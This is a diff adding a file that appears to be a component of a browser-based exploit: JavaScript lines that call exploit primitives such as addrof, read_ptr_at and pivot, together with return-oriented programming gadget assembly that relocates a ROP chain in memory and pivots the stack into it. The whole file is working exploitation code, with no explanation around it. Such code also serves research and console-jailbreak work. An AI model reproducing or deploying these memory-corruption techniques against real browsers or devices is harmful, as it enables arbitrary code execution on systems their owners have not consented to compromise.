@@ -1,0 +1,104 @@
+$$var ropchain1 = read_ptr_at(addrof(ropbuf)+16);
+$$var ropchain1_end = ropchain1 + ropbuf.buffer.byteLength;
+$$var consts_arr = new Uint32Array(ropconsts.length*2);
+$$eval.call(window, js_pre);
+$$for(var i = 0; i < ropconsts.length; i++)
+$${
+$$    var val = (function(){ var ropchain = ropchain1; return eval(ropconsts[i]); })();
+$$    consts_arr[2*i] = val;
+$$    consts_arr[2*i+1] = (val - val % 0x100000000) / 0x100000000;
+$$}
+$$var consts_start = read_ptr_at(addrof(consts_arr)+16);
+
+# back up rdi
+pop rcx
+dp rdi_bak
+mov [rcx], rdi
+
+loop:
+# reading pointer
+pop rdi
+read_p:
+$ropchain1
+
+# loop condition: check if rdi == ropchain1_end
+pop rcx
+$ropchain1_end
+cmp rcx, rdi ; cmovne rax, rcx
+sete al
+movzx eax, al # now eax = (rdi==$ropchain1_end)
+
+# conditional jump
+shl rax, 3
+pop rcx
+dp dispatch_table+0x90
+mov rax, [rax + rcx - 0x90]
+pop rsi
+dp dispatch-0x10
+mov [rsi + 0x10], rax
+pop rsp
+dispatch:
+dq 0
+
+dispatch_table:
+dp loop_continue # if was not equal
+dp loop_break # if was equal
+
+loop_continue:
+
+# read offset into consts
+mov rax, [rdi]
+
+# get offset from consts
+shl rax, 3
+pop rcx
+$consts_start + 0x90
+mov rax, [rax + rcx - 0x90]
+pop rsi
+dp offset-0x10
+mov [rsi + 0x10], rax
+
+# get value and add offset
+pop rsi
+dq 8
+add rdi, rsi
+mov rax, [rdi]
+pop rcx
+offset:
+dq 0
+add rax, rcx
+add rdi, rsi
+
+# increment read pointer
+pop rcx
+dp read_p
+mov [rcx], rdi
+
+# write
+pop rdi
+write_p:
+$ropchain1
+mov [rdi], rax
+
+# increment write pointer
+add rdi, rsi
+pop rcx
+dp write_p
+mov [rcx], rdi
+
+# continue loop
+pop rsp
+dp loop
+
+loop_break:
+
+# jump to relocated ropchain
+pop rdi
+rdi_bak:
+dq 0
+pop rsp
+$ropchain1
+
+$$eval.call(window, js_code);
+$$if(0) //hack to skip autopivot
+$$pivot(ropchain);
